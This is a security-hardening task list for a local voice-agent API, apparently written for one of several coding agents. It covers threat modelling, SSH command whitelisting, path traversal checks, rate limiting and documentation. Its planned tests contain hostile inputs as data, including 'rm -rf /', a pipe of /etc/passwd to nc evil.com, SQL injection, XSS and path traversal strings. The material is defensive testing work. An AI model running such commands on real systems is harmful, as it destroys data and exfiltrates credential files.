# Agent 6: Security, Dependency & Operations Auditor — Task List

**Scope:** Security hardening, dependency health, logging, health checks, documentation  
**Audit Passes:** 13 (security/STRIDE), 14 (deps), 15-16 (performance/ops), 17-19 (docs/upgrade/rollback), 20 (release gate)  
**Estimated Time:** 3-4 hours  
**Dependencies:** Phase 1 (analysis) has none. Phase 2 (security tests) needs Agent 2's input validation.  

---

## Phase 1 Tasks (Start Immediately — Security Analysis)

### TASK 6.1: STRIDE Threat Model for Conscious API

Perform STRIDE analysis on all entry points:

**S — Spoofing (Authentication):**
- Conscious API has NO authentication. Any process on localhost can call any endpoint.
- Risk: Low (localhost-only by default), but HIGH if exposed on 0.0.0.0
- **Action:** Document that Conscious MUST only bind to 127.0.0.1 in production
- **Action:** Add a `--bind` CLI flag that defaults to `127.0.0.1` (currently `0.0.0.0`)
- **File:** `G:\goose\external\conscious\src\conscious\voice\agent_api.py:1009` — change default host

**T — Tampering (Integrity):**
- SSH commands via `/api/devices/ssh` — **CRITICAL: command injection risk**
- Creator artifacts saved to filesystem — path traversal risk
- Personality names in `/api/personality/switch` — could contain path separators
- **Action:** See TASK 6.3 for SSH hardening
- **Action:** See TASK 6.4 for path traversal prevention

**R — Repudiation (Logging):**
- Logging exists via Python `logging` module
- Security events (SSH commands, device scans, creator actions) should be logged at WARNING level
- **Action:** Verify all security-relevant actions are logged with sufficient detail

**I — Information Disclosure:**
- Stack traces may leak in error responses
- **Action:** Ensure all API error handlers return generic messages, not raw Python tracebacks
- **Action:** Verify no secrets/tokens appear in log output

**D — Denial of Service:**
- No rate limiting on any endpoint
- No request body size limits
- Audio endpoint accepts arbitrary data
- **Action:** See TASK 6.5 for rate limiting
- **Action:** Add `client_max_size` to aiohttp app config

**E — Elevation of Privilege:**
- Creator Mode gates device operations — verify it's enforced server-side, not just UI
- **Action:** Verify all device endpoints check `creator_mode` before executing

### TASK 6.2: Dependency Vulnerability Scan

Run these commands and document results:

```bash
# Python dependencies
cd G:\goose\external\conscious && pip install pip-audit && pip-audit

# Node.js dependencies
cd G:\goose\ui\desktop && npm audit

# Check for known CVEs in specific packages
pip install safety && safety check
```

**For each vulnerability found:**
| Package | Version | CVE | Severity | Fix Available? | Action |

**Dependency health check (from End-to-end-Audit.md Pass 14):**
- [ ] All deps version-pinned in pyproject.toml
- [ ] No abandoned dependencies (last release > 12 months)
- [ ] No license conflicts (all MIT/Apache/BSD compatible)
- [ ] `moshi>=0.2.12` — verify this is the correct Kyutai Moshi package (not the Mozilla one)

### TASK 6.3: SSH Command Injection Prevention

**File:** `G:\goose\external\conscious\src\conscious\devices\manager.py`

**CRITICAL:** The SSH endpoint accepts a `command` string and passes it to paramiko. Without sanitization, this allows command injection.

**Verify/implement:**
1. Command whitelist approach — only allow specific safe commands:
```python
ALLOWED_SSH_COMMANDS = {
    "ls", "cat", "echo", "uname", "hostname", "uptime", "df", "free",
    "systemctl status", "docker ps", "docker logs",
}

def validate_ssh_command(command: str) -> bool:
    """Reject commands with injection characters."""
    dangerous_chars = {";", "|", "&", "`", "$", "(", ")", "{", "}", "<", ">", "\\", "\n", "\r"}
    if any(c in command for c in dangerous_chars):
        return False
    # Check first word against whitelist
    first_word = command.strip().split()[0] if command.strip() else ""
    return first_word in ALLOWED_SSH_COMMANDS
```

2. Log every SSH command execution at WARNING level:
```python
logger.warning(f"SSH command executed on {device_id}: {command}")
```

3. Add timeout to SSH command execution (max 30 seconds)

### TASK 6.4: Path Traversal Prevention in Creator

**File:** `G:\goose\external\conscious\src\conscious\agentic\creator.py`

**Verify/implement:**
1. `save_artifact` path is always within the staging directory:
```python
def save_artifact(self, artifact_type: str, content: str) -> Optional[str]:
    safe_name = re.sub(r'[^a-zA-Z0-9_-]', '_', artifact_type)
    filename = f"{safe_name}_{int(time.time())}.json"
    filepath = self._staging_dir / filename
    
    # SECURITY: Ensure path doesn't escape staging directory
    resolved = filepath.resolve()
    if not str(resolved).startswith(str(self._staging_dir.resolve())):
        logger.error(f"Path traversal attempt: {filepath}")
        return None
    
    # ... write file
```

2. `promote_to_active` also validates the source path is within staging and destination is within active directory.

---

## Phase 2 Tasks (Security Tests + Operations)

### TASK 6.5: Rate Limiting on Expensive Endpoints

**File:** `G:\goose\external\conscious\src\conscious\voice\agent_api.py`

Add simple rate limiting middleware for expensive endpoints:

```python
import time
from collections import defaultdict

class RateLimiter:
    """Simple per-endpoint rate limiter."""
    
    def __init__(self, max_requests: int = 10, window_seconds: int = 60):
        self._max = max_requests
        self._window = window_seconds
        self._requests: dict[str, list[float]] = defaultdict(list)
    
    def allow(self, key: str) -> bool:
        now = time.time()
        # Clean old entries
        self._requests[key] = [t for t in self._requests[key] if now - t < self._window]
        if len(self._requests[key]) >= self._max:
            return False
        self._requests[key].append(now)
        return True
```

Apply to these endpoints:
- `/api/devices/scan` — max 5 per minute (network scanning is expensive)
- `/api/devices/ssh` — max 10 per minute (security sensitive)
- `/api/creator/create` — max 5 per minute (calls GooseBridge, slow)
- `/api/testing/validate` — max 5 per minute (runs Playwright, slow)
- `/api/testing/heal` — max 3 per minute (multiple GooseBridge calls)

### TASK 6.6: Create Security Tests (20 tests across 4 files)

**Location:** `G:\goose\external\conscious\tests\security\`

**test_api_input_validation.py (~8 tests):**
```python
class TestAPIInputValidation:
    async def test_sql_injection_in_text_field(self, client):
        """SQL injection strings should be handled safely."""
        r = await client.post("/api/agent/execute", json={"text": "'; DROP TABLE users; --"})
        assert r.status == 200  # Doesn't crash

    async def test_xss_in_personality_name(self, client):
        r = await client.post("/api/personality/switch", json={"name": "<script>alert(1)</script>"})
        assert r.status in (400, 200)  # Either rejected or sanitized

    async def test_path_traversal_in_staging_path(self, client):
        r = await client.post("/api/creator/promote", json={"staging_path": "../../etc/passwd"})
        assert r.status == 400

    async def test_oversized_request_body_rejected(self, client):
        r = await client.post("/api/agent/execute", json={"text": "x" * 100000})
        assert r.status == 400

    async def test_missing_required_fields_return_400(self, client):
        r = await client.post("/api/agent/execute", json={})
        assert r.status == 400

    async def test_invalid_json_returns_400(self, client):
        r = await client.post("/api/agent/execute", data="not json", headers={"Content-Type": "application/json"})
        assert r.status == 400

    async def test_empty_text_field_handling(self, client):
        r = await client.post("/api/agent/execute", json={"text": ""})
        assert r.status == 400

    async def test_special_characters_in_commands(self, client):
        r = await client.post("/api/agent/execute", json={"text": "hello\x00world\ntest"})
        assert r.status in (200, 400)  # Either handled or rejected, not crashed
```

**test_ssh_security.py (~4 tests):**
```python
class TestSSHSecurity:
    async def test_command_injection_via_semicolon(self, client):
        r = await client.post("/api/devices/ssh", json={"device_id": "test", "command": "ls; rm -rf /"})
        data = await r.json()
        assert not data.get("success") or "rejected" in str(data.get("error", "")).lower()

    async def test_command_injection_via_pipe(self, client):
        r = await client.post("/api/devices/ssh", json={"device_id": "test", "command": "cat /etc/passwd | nc evil.com 1234"})
        data = await r.json()
        assert not data.get("success")

    async def test_command_injection_via_backtick(self, client):
        r = await client.post("/api/devices/ssh", json={"device_id": "test", "command": "`rm -rf /`"})
        data = await r.json()
        assert not data.get("success")

    async def test_allowed_commands_whitelist(self, client):
        # Only whitelisted commands should succeed (when device exists and creator mode is on)
        pass  # Test depends on having a mock device
```

**test_device_scan_security.py (~4 tests):**
- `test_scan_blocked_without_creator_mode` — verify 403 or error
- `test_scan_limited_to_local_network` — verify no external IPs accepted
- `test_ip_address_validation` — reject invalid IPs
- `test_port_range_validation` — reject ports outside 1-65535

**test_cors_headers.py (~4 tests):**
- `test_cors_allows_localhost_origins` — verify Access-Control-Allow-Origin
- `test_cors_blocks_external_origins` — verify external origins rejected (once tightened)
- `test_preflight_options_request_handled` — verify OPTIONS returns 200
- `test_cors_headers_present_on_all_responses` — spot check several endpoints

---

## Phase 3 Tasks (Documentation + Operations)

### TASK 6.7: Create 9 Documentation Files

**All in `G:\goose\external\conscious\docs\` (create `docs/` directory if needed):**

**1. README.md** (`G:\goose\external\conscious\README.md` — update or create):
- Project description
- Quick start (3 commands to running)
- Prerequisites (Python 3.10+, hardware requirements for Moshi)
- Installation steps
- Configuration
- Architecture overview (brief)
- Links to other docs

**2. docs/API.md** (Agent 2 creates this — verify or complete):
- All 33 endpoints documented

**3. docs/ARCHITECTURE.md:**
- System diagram (ASCII art or Mermaid)
- Module responsibilities
- Data flow: voice input → intent → action → goose → result → speech
- Port assignments
- File system layout

**4. docs/SETUP.md:**
- Step-by-step installation guide
- Python environment setup
- Optional dependency installation (emotion, wake, devices)
- Verify installation commands
- Troubleshooting common issues

**5. docs/TESTING.md:**
- How to run tests (unit, integration, E2E, performance, security)
- How to write new tests
- Fixture documentation
- Coverage reporting

**6. docs/PERSONALITIES.md:**
- List of all 13 profiles with descriptions
- How to create custom profiles (YAML format)
- Profile fields reference
- Content rating system

**7. docs/DEVICES.md:**
- Device manager overview
- Creator Mode security model
- Supported device types
- Network scanning configuration
- SSH command safety

**8. docs/EMOTION.md:**
- Emotion engine architecture
- Supported emotions (8)
- Model details (Wav2Vec2)
- Trend analysis explanation
- Response modulation behavior

**9. CHANGELOG.md** (`G:\goose\external\conscious\CHANGELOG.md`):
- Version 1.0.0 release notes
- All features implemented
- Known limitations

### TASK 6.8: Health Check Enhancement

**File:** `G:\goose\external\conscious\src\conscious\voice\agent_api.py`

The current `/api/voice/status` endpoint returns basic status. Enhance or create a dedicated `/api/health` endpoint:

```python
async def handle_health(self, request: web.Request) -> web.Response:
    """Comprehensive health check for all subsystems."""
    checks = {
        "api": True,
        "moshi_server": self._server_manager.is_running if self._server_manager else False,
        "moshi_agent": self._moshi_agent.is_connected if self._moshi_agent else False,
        "goose_reachable": await self._goose_bridge.health_check(),
        "ui_bridge": self._ui_bridge._server is not None if self._ui_bridge else False,
        "emotion_model": self._emotion_detector.is_loaded if self._emotion_detector else False,
        "action_queue": not self._action_queue._worker_task.done() if hasattr(self._action_queue, '_worker_task') and self._action_queue._worker_task else False,
    }
    
    all_healthy = all(checks.values())
    status_code = 200 if all_healthy else 503
    
    return web.json_response({
        "status": "healthy" if all_healthy else "degraded",
        "version": "1.0.0",
        "uptime_s": round(time.time() - self._start_time),
        "checks": checks,
    }, status=status_code)
```

Register the route: `app.router.add_get("/api/health", self.handle_health)`

### TASK 6.9: Structured Logging Audit

**Objective:** Verify all log statements follow structured format.

**Rules:**
1. All `logger.error()` calls include the exception: `logger.error(f"...: {e}", exc_info=True)`
2. No `print()` statements in production code — use `logger.info()` instead
3. No sensitive data in logs (API keys, tokens, passwords, raw audio data)
4. Security events logged at WARNING: SSH commands, device scans, creator mode toggle
5. Startup logs include version, port, config summary

**Search for violations:**
```bash
# Find print statements
grep -rn "print(" G:\goose\external\conscious\src\conscious\ --include="*.py" | grep -v "__name__"

# Find bare except
grep -rn "except:" G:\goose\external\conscious\src\conscious\ --include="*.py"

# Find logger.error without exc_info
grep -rn "logger.error" G:\goose\external\conscious\src\conscious\ --include="*.py" | grep -v "exc_info"
```

### TASK 6.10: Bind Address Security Fix

**File:** `G:\goose\external\conscious\src\conscious\voice\agent_api.py`

Change default bind address from `0.0.0.0` to `127.0.0.1`:

```python
def run(self, host: str = "127.0.0.1", port: Optional[int] = None) -> None:
```

Also update the CLI argument parser to accept `--host` with default `127.0.0.1`.

---

## Verification Checkpoints

### After Phase 1 (Security Analysis):
- Produce STRIDE threat table with all findings
- Produce dependency vulnerability scan results
- All SSH injection vectors documented and fixed

### After Phase 2 (Security Tests):
```bash
cd G:\goose\external\conscious && python -m pytest tests/security/ -v --timeout=30 -x
# Target: 20 tests, ALL passing
```

### After Phase 3 (Docs + Ops):
- All 9 documentation files exist and are non-empty
- README quick start commands verified working
- Health check endpoint returns correct status
- No `print()` statements in production code
- Default bind address is `127.0.0.1`

### Final Release Gate (Pass 20):
Verify ALL items in MASTER_ACTION_PLAN.md section 7 "Go/No-Go Release Criteria"

---

## Files Created/Modified Summary

| Action | File |
|--------|------|
| MODIFY | `G:\goose\external\conscious\src\conscious\voice\agent_api.py` (health endpoint, bind address, rate limiting) |
| MODIFY | `G:\goose\external\conscious\src\conscious\devices\manager.py` (SSH hardening) |
| MODIFY | `G:\goose\external\conscious\src\conscious\agentic\creator.py` (path traversal prevention) |
| CREATE | `G:\goose\external\conscious\tests\security\test_api_input_validation.py` |
| CREATE | `G:\goose\external\conscious\tests\security\test_ssh_security.py` |
| CREATE | `G:\goose\external\conscious\tests\security\test_device_scan_security.py` |
| CREATE | `G:\goose\external\conscious\tests\security\test_cors_headers.py` |
| CREATE | `G:\goose\external\conscious\README.md` (or update) |
| CREATE | `G:\goose\external\conscious\docs\ARCHITECTURE.md` |
| CREATE | `G:\goose\external\conscious\docs\SETUP.md` |
| CREATE | `G:\goose\external\conscious\docs\TESTING.md` |
| CREATE | `G:\goose\external\conscious\docs\PERSONALITIES.md` |
| CREATE | `G:\goose\external\conscious\docs\DEVICES.md` |
| CREATE | `G:\goose\external\conscious\docs\EMOTION.md` |
| CREATE | `G:\goose\external\conscious\CHANGELOG.md` |
